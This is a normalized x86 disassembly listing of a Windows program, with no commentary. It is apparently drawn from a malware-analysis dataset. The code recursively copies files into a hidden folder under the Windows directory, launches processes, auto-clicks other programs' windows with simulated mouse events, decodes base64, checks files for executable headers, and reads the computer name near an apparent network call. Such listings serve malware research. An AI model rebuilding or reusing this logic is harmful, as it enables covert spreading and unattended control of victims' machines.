test eax eax
je r-xdata
cmp [ ebp - 0x8 ] ebx
jl r-xdata
sub_4038c6
push ebx
push esi
mov esi [ FindNextFileA@IAT ]
push edi
mov edi [ esp + 0x14 ]
xor ebx ebx
push edi
push [ esp + 0x14 ]
mov eax ebx
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
jmp r-xdata
push edi
call sub_4039ca
test eax eax
pop ecx
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp ebx 0x64
jge r-xdata
inc ebx
add edi 0x140
push edi
push [ esp + 0x14 ]
jmp r-xdata
call esi
test eax eax
je r-xdata
sub_403912
push ebp
mov ebp esp
sub esp 0x140
push esi
lea eax [ ebp - 0x140 ]
push edi
push eax
push [ ebp + 0x8 ]
xor edi edi
call [ FindFirstFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov eax edi
lea eax [ ebp - 0x140 ]
push eax
call sub_4039ca
test eax eax
pop ecx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
inc edi
push esi
call [ FindClose@IAT ]
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x140 ]
push eax
push esi
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push esi
call [ FindClose@IAT ]
jmp r-xdata
sub_40397e
and [ rw-data ] 0x0
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push edi
push edi
call sub_405450
cmp eax 0x2
pop ecx
jb r-xdata
and [ esi ] 0x0
test esi esi
jne r-xdata
mov eax [ rw-data ]
inc [ rw-data ]
mov [ eax * 4 + rw-data ] edi
lea edi [ esi + 0x1 ]
push 0x3b
push edi
call sub_405d80
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
pop edi
sub_4039ca
mov eax [ esp + 0x4 ]
push ebx
push ebp
push esi
test [ eax ] 0x10
push edi
jne r-xdata
push 0x1
pop eax
jmp r-xdata
add eax 0x2c
push 0x2e
push eax
call sub_405ba0
xor ebp ebp
pop ecx
cmp [ rw-data ] ebp
pop ecx
mov ebx eax
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
xor eax eax
mov edi [ lstrcmpiA@IAT ]
mov esi rw-data
test ebx ebx
je r-xdata
push rw-data
push [ esi ]
mov eax [ esi ]
inc eax
inc eax
push eax
lea eax [ ebx + 0x1 ]
push eax
jmp r-xdata
inc ebp
add esi 0x4
cmp ebp [ rw-data ]
jl r-xdata
call edi
test eax eax
je r-xdata
push rw-data
push [ esi ]
call edi
test eax eax
je r-xdata
sub_403a3c
push ebp
mov ebp esp
push ecx
push ecx
mov al [ rw-data ]
push 0x6
mov [ ebp - 0x3 ] al
pop eax
mov [ ebp - 0x7 ] eax
push eax
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] 0x52
push eax
call sub_402502
pop ecx
pop ecx
leave
retn
sub_403a61
push ebp
mov ebp esp
sub esp 0x10c
push ebx
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi rw-data
push rw-data
push esi
call sub_405b85
mov ebx eax
pop ecx
cmp ebx edi
pop ecx
jne r-xdata
mov eax [ rw-data ]
mov [ rw-data ] 0x1
add eax 0x4
push eax
call sub_405450
cmp eax 0x114
pop ecx
mov [ ebp - 0x8 ] eax
jae r-xdata
mov edi [ rw-data ]
mov eax [ rw-data ]
push edi
call sub_405ab8
pop ecx
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
mov esi rw-data
add eax 0x4
push eax
push esi
call sub_405540
cmp [ rw-data ] 0x56
pop ecx
pop ecx
jne r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x4f
call sub_403a3c
cmp [ rw-data ] 0x56
jne r-xdata
push edi
push esi
call [ SetFileAttributesA@IAT ]
mov eax [ rw-data ]
cmp [ eax ] edi
je r-xdata
push edi
lea eax [ ebp - 0x10c ]
push 0x15
push eax
push edi
call [ SHGetSpecialFolderPathA@IAT ]
lea eax [ ebp - 0x10c ]
push esi
push eax
lea eax [ ebp - 0x10c ]
push rw-data
push eax
call sub_405630
lea eax [ ebp - 0x10c ]
push eax
push esi
call sub_405540
add esp 0x18
push esi
call sub_403bcb
pop ecx
push rw-data
push rw-data
jmp r-xdata
mov [ rw-data ] 0x45
call sub_403a3c
jmp r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x8 ]
lea edi [ eax + ecx + 0x5 ]
mov eax [ rw-data ]
sub eax ecx
sub eax 0x5
jmp r-xdata
push esi
call sub_405b85
mov ebx eax
pop ecx
cmp ebx edi
pop ecx
je r-xdata
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
push ecx
push edi
push eax
push edi
call sub_402aa7
push ebx
push [ ebp - 0x4 ]
push 0x1
push edi
call sub_406142
push ebx
call sub_405ab8
add esp 0x24
cmp [ rw-data ] 0x0
je r-xdata
sub_403bcb
push ebp
mov ebp esp
sub esp 0x254
push ebx
push rw-data
push [ ebp + 0x8 ]
call sub_405e40
pop ecx
xor ebx ebx
test eax eax
pop ecx
jne r-xdata
push 0x44
lea eax [ ebp - 0x54 ]
push ebx
push eax
call sub_405a60
add esp 0xc
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x24 ] bx
push eax
lea eax [ ebp - 0x54 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push [ ebp + 0x8 ]
push ebx
call [ CreateProcessA@IAT ]
pop ebx
leave
retn
push [ ebp + 0x8 ]
lea eax [ ebp - 0x254 ]
push eax
call sub_405540
lea eax [ ebp - 0x254 ]
push 0x22
push eax
call sub_405d80
add esp 0x10
cmp eax ebx
je r-xdata
inc eax
push 0x22
push eax
call sub_405d80
pop ecx
cmp eax ebx
pop ecx
je r-xdata
mov [ eax ] bl
lea eax [ ebp - 0x254 ]
push 0x5c
push eax
call sub_405ba0
pop ecx
cmp eax ebx
pop ecx
je r-xdata
cmp [ eax - 0x1 ] 0x3a
jne r-xdata
mov [ eax ] bl
mov [ eax + 0x1 ] bl
jmp r-xdata
lea eax [ ebp - 0x253 ]
push eax
call [ SetCurrentDirectoryA@IAT ]
sub_403c82
push ebp
mov ebp esp
sub esp 0x408
mov [ rw-data ] 0x4f
call sub_403a3c
push [ rw-data ]
call sub_405450
pop ecx
mov ecx [ rw-data ]
add eax ecx
cmp [ eax - 0x2 ] 0x3a
jne r-xdata
lea eax [ ebp - 0x200 ]
push 0x200
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x200 ]
push rw-data
push eax
call sub_405550
pop ecx
lea eax [ ebp - 0x200 ]
pop ecx
push 0x0
push eax
call [ CreateDirectoryA@IAT ]
lea eax [ ebp - 0x200 ]
push eax
call [ GetFileAttributesA@IAT ]
or al 0x2
push eax
lea eax [ ebp - 0x200 ]
push eax
call [ SetFileAttributesA@IAT ]
push [ rw-data ]
call sub_405450
mov ecx [ rw-data ]
and [ eax + ecx - 0x1 ] 0x0
push [ rw-data ]
lea eax [ ebp - 0x408 ]
push rw-data
push eax
call [ wsprintfW@IAT ]
lea eax [ ebp - 0x200 ]
push eax
lea eax [ ebp - 0x408 ]
push eax
call sub_403d52
add esp 0x18
cmp [ eax - 0x1 ] 0x5c
je r-xdata
leave
retn
sub_403d52
push ebp
mov ebp esp
mov eax 0x126c
call sub_405f70
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
xor eax eax
jmp r-xdata
push [ ebp + 0x8 ]
mov esi [ wsprintfW@IAT ]
lea eax [ ebp - 0xc6c ]
push rw-data
push eax
call esi
add esp 0xc
lea eax [ ebp - 0x364 ]
push eax
lea eax [ ebp - 0xc6c ]
push eax
call [ FindFirstFileW@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x1
pop eax
mov edi rw-data
lea eax [ ebp - 0x14 ]
push eax
call [ GetLocalTime@IAT ]
movzx eax [ ebp - 0xa ]
push [ rw-data ]
push eax
movzx eax [ ebp - 0xc ]
push eax
movzx eax [ ebp - 0xe ]
push eax
movzx eax [ ebp - 0x12 ]
push eax
lea eax [ ebp - 0x864 ]
push rw-data
push eax
call esi
mov eax [ rw-data ]
add esp 0x1c
inc [ rw-data ]
cmp eax 0x1869f
jle r-xdata
lea eax [ ebp - 0x338 ]
push rw-data
push eax
call sub_40628c
pop ecx
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x564 ]
push 0x2e
push eax
call sub_40624c
mov ebx eax
lea eax [ ebp - 0x564 ]
push eax
lea eax [ ebp - 0xe6c ]
push [ ebp + 0x8 ]
push edi
push eax
call esi
add esp 0x18
test ebx ebx
jne r-xdata
and [ rw-data ] 0x0
lea eax [ ebp - 0x364 ]
push eax
push [ ebp - 0x4 ]
call [ FindNextFileW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x338 ]
push rw-data
push eax
call sub_40628c
pop ecx
test eax eax
pop ecx
je r-xdata
add ebx 0x2
lea eax [ ebp - 0x864 ]
push ebx
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xa64 ]
push rw-data
push eax
call esi
add esp 0x14
lea eax [ ebp - 0x864 ]
push eax
lea eax [ ebp - 0xa64 ]
push [ ebp + 0xc ]
push rw-data
push eax
call esi
add esp 0x10
jmp r-xdata
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
jmp r-xdata
push [ rw-data ]
lea eax [ ebp - 0x664 ]
push rw-data
push eax
call sub_405630
mov eax [ rw-data ]
add esp 0xc
inc [ rw-data ]
cmp eax 0x1869f
jle r-xdata
lea eax [ ebp - 0xa64 ]
push 0x0
push eax
lea eax [ ebp - 0xe6c ]
push eax
call [ CopyFileW@IAT ]
lea eax [ ebp - 0x338 ]
push eax
lea eax [ ebp - 0x564 ]
push eax
call sub_4062c1
test [ ebp - 0x364 ] 0x10
pop ecx
pop ecx
je r-xdata
lea eax [ ebp - 0x564 ]
push eax
lea eax [ ebp - 0x126c ]
push [ ebp + 0x8 ]
push edi
push eax
call esi
lea eax [ ebp - 0x664 ]
push eax
lea eax [ ebp - 0x114 ]
push [ ebp + 0xc ]
push rw-data
push eax
call sub_405630
add esp 0x20
lea eax [ ebp - 0x114 ]
push 0x0
push eax
call [ CreateDirectoryA@IAT ]
lea eax [ ebp - 0x114 ]
push eax
lea eax [ ebp - 0x126c ]
push eax
call sub_403d52
pop ecx
test eax eax
pop ecx
je r-xdata
and [ rw-data ] 0x0
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
jmp r-xdata
sub_403f9e
mov eax sub_40c034
call sub_40542c
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ Sleep@IAT ]
push esi
mov esi [ GetWindow@IAT ]
push edi
mov edi [ GetForegroundWindow@IAT ]
mov [ ebp - 0x10 ] esp
mov ecx [ ebp - 0xc ]
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
push 0x0
mov [ rw-data ] rw-data
mov [ rw-data ] 0x1f
call edi
push eax
call esi
push eax
call sub_404035
pop ecx
push 0xa
call ebx
push 0x0
mov [ rw-data ] rw-data
mov [ rw-data ] 0x8
call edi
push eax
call esi
push eax
call sub_404035
pop ecx
push 0xa
call ebx
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
sub_404035
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push edi
mov edi [ GetWindow@IAT ]
push 0x5
push esi
call edi
push eax
call sub_404035
pop ecx
push 0x2
push esi
call edi
mov esi eax
test esi esi
jne r-xdata
push esi
call sub_4041f3
pop ecx
push esi
call sub_404071
test eax eax
pop ecx
je r-xdata
pop edi
sub_404071
push ebp
mov ebp esp
sub esp 0x280
mov al [ rw-data ]
push esi
push edi
push 0x1f
mov [ ebp - 0x80 ] al
pop ecx
xor eax eax
lea edi [ ebp - 0x7f ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x80 ]
push 0x80
push eax
push [ ebp + 0x8 ]
call [ GetClassNameA@IAT ]
mov esi [ rw-data ]
xor eax eax
test esi esi
mov [ rw-data ] eax
jle r-xdata
xor eax eax
imul eax eax 0x20c
add eax [ rw-data ]
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_405690
pop ecx
test eax eax
pop ecx
jne r-xdata
mov eax [ rw-data ]
inc eax
cmp eax esi
mov [ rw-data ] eax
jge r-xdata
mov al [ rw-data ]
push 0x7f
mov [ ebp - 0x280 ] al
pop ecx
xor eax eax
lea edi [ ebp - 0x27f ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x280 ]
push 0x200
push eax
push [ ebp + 0x8 ]
call [ GetWindowTextA@IAT ]
mov eax [ rw-data ]
mov edx [ rw-data ]
mov ecx eax
imul ecx ecx 0x20c
add ecx edx
cmp [ ecx + 0x200 ] 0x0
je r-xdata
jmp r-xdata
imul eax eax 0x20c
mov ecx [ rw-data ]
cmp [ eax + ecx + 0x204 ] 0x0
jne r-xdata
cmp [ ecx + 0x208 ] 0x0
je r-xdata
push 0x1
pop eax
jmp r-xdata
push rw-data
push [ ebp + 0x8 ]
call [ GetWindowRect@IAT ]
push 0xa
pop eax
mov [ rw-data ] eax
mov [ rw-data ] eax
lea eax [ ebp - 0x80 ]
push rw-data
push eax
call sub_405690
pop ecx
test eax eax
pop ecx
jne r-xdata
add ecx 0x100
lea eax [ ebp - 0x280 ]
push ecx
push eax
call sub_405e40
pop ecx
pop ecx
add ecx 0x100
lea eax [ ebp - 0x280 ]
push ecx
push eax
call sub_405690
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
jmp r-xdata
pop edi
pop esi
leave
retn
mov eax [ rw-data ]
sub eax [ rw-data ]
cmp eax 0x12c
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov [ rw-data ] 0xb5
mov [ rw-data ] 0x35
sub_4041f3
mov eax [ rw-data ]
mov ecx [ rw-data ]
imul eax eax 0x20c
cmp [ eax + ecx + 0x204 ] 0x0
je r-xdata
call sub_40426d
mov eax [ rw-data ]
push rw-data
imul eax eax 0x20c
add eax [ rw-data ]
push eax
call sub_405690
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
push edi
mov esi [ SendMessageA@IAT ]
mov edi 0xa0005
push edi
push 0x0
push 0x201
push [ esp + 0x18 ]
call esi
push edi
push 0x0
push 0x202
push [ esp + 0x18 ]
call esi
pop edi
pop esi
retn
sub [ rw-data ] 0x14
jmp sub_40426d
sub_40426d
push ebx
push ebp
push esi
mov esi [ GetSystemMetrics@IAT ]
xor ebp ebp
push edi
push ebp
call esi
mov ebx 0xffff
mov ecx eax
mov eax ebx
dec ecx
cdq
idiv ecx
push 0x1
mov edi eax
call esi
mov ecx eax
mov eax ebx
cdq
dec ecx
push ebp
idiv ecx
push ebp
mov esi [ mouse_event@IAT ]
mov ebx eax
mov eax [ rw-data ]
sub eax [ rw-data ]
imul eax ebx
push eax
mov eax [ rw-data ]
sub eax [ rw-data ]
imul eax edi
push eax
push 0x8001
call esi
mov ebp [ Sleep@IAT ]
push 0x28
call ebp
mov eax [ rw-data ]
push 0x0
sub eax [ rw-data ]
push 0x0
imul eax ebx
push eax
mov eax [ rw-data ]
sub eax [ rw-data ]
imul eax edi
push eax
push 0x8002
call esi
push 0x28
call ebp
mov eax [ rw-data ]
push 0x0
sub eax [ rw-data ]
push 0x0
imul eax ebx
push eax
mov eax [ rw-data ]
sub eax [ rw-data ]
imul eax edi
push eax
push 0x8004
call esi
pop edi
pop esi
pop ebp
pop ebx
retn
sub_40432b
push ebp
mov ebp esp
push edi
push rw-data
push [ ebp + 0x8 ]
call sub_405b85
mov edi eax
pop ecx
test edi edi
pop ecx
je r-xdata
pop edi
pop ebp
retn
push esi
push 0x1
pop esi
push edi
call sub_405ab8
pop ecx
mov eax esi
pop esi
movsx eax [ ebp + 0xb ]
push eax
call sub_4062e6
test eax eax
pop ecx
jne r-xdata
push edi
push esi
lea eax [ ebp + 0xb ]
push esi
push eax
call sub_405fce
add esp 0x10
test eax eax
je r-xdata
movsx eax [ ebp + 0xb ]
push eax
call sub_406314
test eax eax
pop ecx
jne r-xdata
mov al [ ebp + 0xb ]
cmp al 0x2b
je r-xdata
cmp al 0x2f
je r-xdata
cmp al 0x3d
je r-xdata
cmp al 0xd
je r-xdata
cmp al 0xa
je r-xdata
xor esi esi
sub_40439f
push ebp
mov ebp esp
sub esp 0x114
and [ ebp - 0xc3 ] 0x0
push ebx
mov bl 0xff
push edi
mov [ ebp - 0x104 ] bl
mov [ ebp - 0x103 ] bl
mov [ ebp - 0x102 ] bl
mov [ ebp - 0x101 ] bl
mov [ ebp - 0x100 ] bl
mov [ ebp - 0xff ] bl
mov [ ebp - 0xfe ] bl
mov [ ebp - 0xfd ] bl
mov [ ebp - 0xfc ] bl
mov [ ebp - 0xfb ] bl
mov [ ebp - 0xfa ] bl
mov [ ebp - 0xf9 ] bl
mov [ ebp - 0xf8 ] bl
mov [ ebp - 0xf7 ] bl
mov [ ebp - 0xf6 ] bl
mov [ ebp - 0xf5 ] bl
mov [ ebp - 0xf4 ] bl
mov [ ebp - 0xf3 ] bl
mov [ ebp - 0xf2 ] bl
mov [ ebp - 0xf1 ] bl
mov [ ebp - 0xf0 ] bl
mov [ ebp - 0xef ] bl
mov [ ebp - 0xee ] bl
mov [ ebp - 0xed ] bl
mov [ ebp - 0xec ] bl
mov [ ebp - 0xeb ] bl
mov [ ebp - 0xea ] bl
mov [ ebp - 0xe9 ] bl
mov [ ebp - 0xe8 ] bl
mov [ ebp - 0xe7 ] bl
mov [ ebp - 0xe6 ] bl
mov [ ebp - 0xe5 ] bl
mov [ ebp - 0xe4 ] bl
mov [ ebp - 0xe3 ] bl
mov [ ebp - 0xe2 ] bl
mov [ ebp - 0xe1 ] bl
mov [ ebp - 0xe0 ] bl
mov [ ebp - 0xdf ] bl
mov [ ebp - 0xde ] bl
mov [ ebp - 0xdd ] bl
mov [ ebp - 0xdc ] bl
mov [ ebp - 0xdb ] bl
mov [ ebp - 0xda ] bl
mov [ ebp - 0xd9 ] 0x3e
mov [ ebp - 0xd8 ] bl
mov [ ebp - 0xd7 ] bl
mov [ ebp - 0xd6 ] bl
mov [ ebp - 0xd5 ] 0x3f
mov [ ebp - 0xd4 ] 0x34
mov [ ebp - 0xd3 ] 0x35
mov [ ebp - 0xd2 ] 0x36
mov [ ebp - 0xd1 ] 0x37
mov [ ebp - 0xd0 ] 0x38
mov [ ebp - 0xcf ] 0x39
mov [ ebp - 0xce ] 0x3a
mov [ ebp - 0xcd ] 0x3b
mov [ ebp - 0xcc ] 0x3c
mov [ ebp - 0xcb ] 0x3d
mov [ ebp - 0xca ] bl
mov [ ebp - 0xc9 ] bl
mov [ ebp - 0xc8 ] bl
mov [ ebp - 0xc7 ] bl
mov [ ebp - 0xc6 ] bl
mov [ ebp - 0xc5 ] bl
mov [ ebp - 0xc4 ] bl
mov [ ebp - 0xc2 ] 0x1
mov [ ebp - 0xc1 ] 0x2
mov [ ebp - 0xc0 ] 0x3
mov [ ebp - 0xbf ] 0x4
mov [ ebp - 0xbe ] 0x5
mov [ ebp - 0xbd ] 0x6
mov [ ebp - 0xbc ] 0x7
mov [ ebp - 0xbb ] 0x8
mov [ ebp - 0xba ] 0x9
mov [ ebp - 0xb9 ] 0xa
mov [ ebp - 0xb8 ] 0xb
mov [ ebp - 0xb7 ] 0xc
mov [ ebp - 0xb6 ] 0xd
mov [ ebp - 0xb5 ] 0xe
mov [ ebp - 0xb4 ] 0xf
mov [ ebp - 0xb3 ] 0x10
mov [ ebp - 0xb2 ] 0x11
mov [ ebp - 0xb1 ] 0x12
mov [ ebp - 0xb0 ] 0x13
mov [ ebp - 0xaf ] 0x14
mov [ ebp - 0xae ] 0x15
mov [ ebp - 0xad ] 0x16
mov [ ebp - 0xac ] 0x17
mov [ ebp - 0xab ] 0x18
mov [ ebp - 0xaa ] 0x19
mov [ ebp - 0xa9 ] bl
mov [ ebp - 0xa8 ] bl
mov [ ebp - 0xa7 ] bl
mov [ ebp - 0xa6 ] bl
mov [ ebp - 0xa5 ] bl
mov [ ebp - 0xa4 ] bl
mov [ ebp - 0xa3 ] 0x1a
mov [ ebp - 0xa2 ] 0x1b
mov [ ebp - 0xa1 ] 0x1c
mov [ ebp - 0xa0 ] 0x1d
mov [ ebp - 0x9f ] 0x1e
mov [ ebp - 0x9e ] 0x1f
mov [ ebp - 0x9d ] 0x20
mov [ ebp - 0x9c ] 0x21
mov [ ebp - 0x9b ] 0x22
mov [ ebp - 0x9a ] 0x23
mov [ ebp - 0x99 ] 0x24
mov [ ebp - 0x98 ] 0x25
mov [ ebp - 0x97 ] 0x26
mov [ ebp - 0x96 ] 0x27
mov [ ebp - 0x95 ] 0x28
mov [ ebp - 0x94 ] 0x29
mov [ ebp - 0x93 ] 0x2a
mov [ ebp - 0x92 ] 0x2b
mov [ ebp - 0x91 ] 0x2c
mov [ ebp - 0x90 ] 0x2d
mov [ ebp - 0x8f ] 0x2e
mov [ ebp - 0x8e ] 0x2f
mov [ ebp - 0x8d ] 0x30
mov [ ebp - 0x8c ] 0x31
mov [ ebp - 0x8b ] 0x32
mov [ ebp - 0x8a ] 0x33
mov [ ebp - 0x89 ] bl
mov [ ebp - 0x88 ] bl
mov [ ebp - 0x87 ] bl
mov [ ebp - 0x86 ] bl
mov [ ebp - 0x85 ] bl
mov [ ebp - 0x84 ] bl
mov [ ebp - 0x83 ] bl
mov [ ebp - 0x82 ] bl
mov [ ebp - 0x81 ] bl
mov [ ebp - 0x80 ] bl
mov [ ebp - 0x7f ] bl
mov [ ebp - 0x7e ] bl
mov [ ebp - 0x7d ] bl
mov [ ebp - 0x7c ] bl
mov [ ebp - 0x7b ] bl
mov [ ebp - 0x7a ] bl
mov [ ebp - 0x79 ] bl
mov [ ebp - 0x78 ] bl
mov [ ebp - 0x77 ] bl
mov [ ebp - 0x76 ] bl
mov [ ebp - 0x75 ] bl
mov [ ebp - 0x74 ] bl
mov [ ebp - 0x73 ] bl
mov [ ebp - 0x72 ] bl
mov [ ebp - 0x71 ] bl
mov [ ebp - 0x70 ] bl
mov [ ebp - 0x6f ] bl
mov [ ebp - 0x6e ] bl
mov [ ebp - 0x6d ] bl
mov [ ebp - 0x6c ] bl
mov [ ebp - 0x6b ] bl
mov [ ebp - 0x6a ] bl
mov [ ebp - 0x69 ] bl
mov [ ebp - 0x68 ] bl
mov [ ebp - 0x67 ] bl
mov [ ebp - 0x66 ] bl
mov [ ebp - 0x65 ] bl
mov [ ebp - 0x64 ] bl
mov [ ebp - 0x63 ] bl
mov [ ebp - 0x62 ] bl
mov [ ebp - 0x61 ] bl
mov [ ebp - 0x60 ] bl
mov [ ebp - 0x5f ] bl
mov [ ebp - 0x5e ] bl
mov [ ebp - 0x5d ] bl
mov [ ebp - 0x5c ] bl
mov [ ebp - 0x5b ] bl
mov [ ebp - 0x5a ] bl
mov [ ebp - 0x59 ] bl
mov [ ebp - 0x58 ] bl
mov [ ebp - 0x57 ] bl
mov [ ebp - 0x56 ] bl
mov [ ebp - 0x55 ] bl
mov [ ebp - 0x54 ] bl
mov [ ebp - 0x53 ] bl
mov [ ebp - 0x52 ] bl
mov [ ebp - 0x51 ] bl
mov [ ebp - 0x50 ] bl
mov [ ebp - 0x4f ] bl
mov [ ebp - 0x4e ] bl
mov [ ebp - 0x4d ] bl
mov [ ebp - 0x4c ] bl
mov [ ebp - 0x4b ] bl
mov [ ebp - 0x4a ] bl
mov [ ebp - 0x49 ] bl
mov [ ebp - 0x48 ] bl
mov [ ebp - 0x47 ] bl
mov [ ebp - 0x46 ] bl
mov [ ebp - 0x45 ] bl
mov [ ebp - 0x44 ] bl
mov [ ebp - 0x43 ] bl
mov [ ebp - 0x42 ] bl
mov [ ebp - 0x41 ] bl
mov [ ebp - 0x40 ] bl
mov [ ebp - 0x3f ] bl
mov [ ebp - 0x3e ] bl
mov [ ebp - 0x3d ] bl
mov [ ebp - 0x3c ] bl
mov [ ebp - 0x3b ] bl
mov [ ebp - 0x3a ] bl
mov [ ebp - 0x39 ] bl
mov [ ebp - 0x38 ] bl
mov [ ebp - 0x37 ] bl
mov [ ebp - 0x36 ] bl
mov [ ebp - 0x35 ] bl
mov [ ebp - 0x34 ] bl
mov [ ebp - 0x33 ] bl
mov [ ebp - 0x32 ] bl
mov [ ebp - 0x31 ] bl
mov [ ebp - 0x30 ] bl
mov [ ebp - 0x2f ] bl
mov [ ebp - 0x2e ] bl
mov [ ebp - 0x2d ] bl
mov [ ebp - 0x2c ] bl
mov [ ebp - 0x2b ] bl
mov [ ebp - 0x2a ] bl
mov [ ebp - 0x29 ] bl
mov [ ebp - 0x28 ] bl
mov [ ebp - 0x27 ] bl
mov [ ebp - 0x26 ] bl
mov [ ebp - 0x25 ] bl
mov [ ebp - 0x24 ] bl
mov [ ebp - 0x23 ] bl
mov [ ebp - 0x22 ] bl
mov [ ebp - 0x21 ] bl
mov [ ebp - 0x20 ] bl
mov [ ebp - 0x1f ] bl
mov [ ebp - 0x1e ] bl
mov [ ebp - 0x1d ] bl
mov [ ebp - 0x1c ] bl
mov [ ebp - 0x1b ] bl
mov [ ebp - 0x1a ] bl
mov [ ebp - 0x19 ] bl
mov [ ebp - 0x18 ] bl
mov [ ebp - 0x17 ] bl
mov [ ebp - 0x16 ] bl
mov [ ebp - 0x15 ] bl
push rw-data
mov [ ebp - 0x14 ] bl
push [ ebp + 0x8 ]
mov [ ebp - 0x13 ] bl
mov [ ebp - 0x12 ] bl
mov [ ebp - 0x11 ] bl
mov [ ebp - 0x10 ] bl
mov [ ebp - 0xf ] bl
mov [ ebp - 0xe ] bl
mov [ ebp - 0xd ] bl
mov [ ebp - 0xc ] bl
mov [ ebp - 0xb ] bl
mov [ ebp - 0xa ] bl
mov [ ebp - 0x9 ] bl
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] bl
mov [ ebp - 0x5 ] bl
call sub_405b85
push rw-data
mov edi eax
push [ ebp + 0xc ]
mov [ ebp - 0x114 ] edi
call sub_405b85
add esp 0x10
mov [ ebp - 0x110 ] eax
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
test eax eax
jne r-xdata
pop edi
pop ebx
leave
retn
and [ ebp - 0x108 ] 0x0
and [ ebp - 0x10c ] 0x0
push esi
push edi
push 0x1
pop esi
push edi
call sub_405ab8
pop ecx
movzx eax [ ebp + 0xb ]
mov al [ ebp + eax - 0x104 ]
mov [ ebp + 0xf ] al
movzx eax [ ebp + 0xb ]
cmp [ ebp + eax - 0x104 ] bl
jne r-xdata
push edi
call sub_405ab8
push [ ebp - 0x110 ]
call sub_405ab8
pop ecx
mov eax esi
pop ecx
pop esi
movzx eax [ ebp + 0xb ]
mov cl [ ebp + eax - 0x104 ]
cmp cl bl
je r-xdata
push edi
jmp r-xdata
mov edi [ ebp - 0x114 ]
jmp r-xdata
mov eax [ ebp - 0x108 ]
push 0x3
xor edx edx
pop edi
div edi
test edx edx
jne r-xdata
push esi
lea eax [ ebp + 0xb ]
push esi
push eax
call sub_405fce
add esp 0x10
test eax eax
je r-xdata
push edi
push esi
lea eax [ ebp + 0xb ]
push esi
push eax
call sub_405fce
add esp 0x10
test eax eax
je r-xdata
cmp edx esi
jne r-xdata
cmp [ ebp - 0x10c ] edx
je r-xdata
cmp edx 0x2
jne r-xdata
mov al [ ebp + 0xf ]
shr cl 0x2
shl al 0x4
jmp r-xdata
mov al [ ebp + 0xf ]
shr cl 0x4
shl al 0x2
and [ ebp - 0x10c ] edx
mov [ ebp + 0xf ] cl
jmp r-xdata
push [ ebp - 0x110 ]
lea eax [ ebp - 0x1 ]
push esi
push esi
push eax
call sub_406142
movzx eax [ ebp + 0xb ]
add esp 0x10
inc [ ebp - 0x108 ]
mov al [ ebp + eax - 0x104 ]
mov [ ebp + 0xf ] al
mov al [ ebp + 0xf ]
mov [ ebp - 0x10c ] esi
shl al 0x6
or al cl
mov [ ebp - 0x1 ] al
or cl al
mov [ ebp - 0x1 ] cl
jmp r-xdata
sub_4049cc
push ebp
mov ebp esp
push esi
push rw-data
push [ ebp + 0x8 ]
call sub_405b85
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
xor eax eax
push esi
push 0x2
lea eax [ ebp + 0xa ]
push 0x1
push eax
call sub_405fce
push esi
call sub_405ab8
add esp 0x14
cmp [ ebp + 0xa ] 0x5a4d
jne r-xdata
push 0x1
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_404a0e
push ebp
mov ebp esp
sub esp 0x8c
push esi
push edi
push 0x3e800
call sub_4054cb
mov edi eax
xor esi esi
cmp edi esi
pop ecx
jne r-xdata
lea eax [ ebp - 0x4 ]
push esi
push eax
push edi
push esi
push rw-data
push [ ebp + 0x8 ]
mov [ ebp - 0x8 ] esi
push 0x50
push rw-data
call sub_401eea
add esp 0x20
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push edi
call sub_405f9f
pop ecx
mov eax esi
mov eax [ ebp - 0x4 ]
push ebx
and [ eax + edi ] 0x0
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8c ]
push eax
mov [ ebp - 0xc ] 0x80
call [ GetComputerNameA@IAT ]
lea esi [ edi - 0x2 ]
pop edi
pop esi
leave
retn
mov esi [ ebp - 0x8 ]
pop ebx
test esi esi
je r-xdata
lea ebx [ esi + 0x2 ]
push 0xd
push ebx
call sub_405d80
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
lea eax [ ebp - 0x8c ]
push eax
push ebx
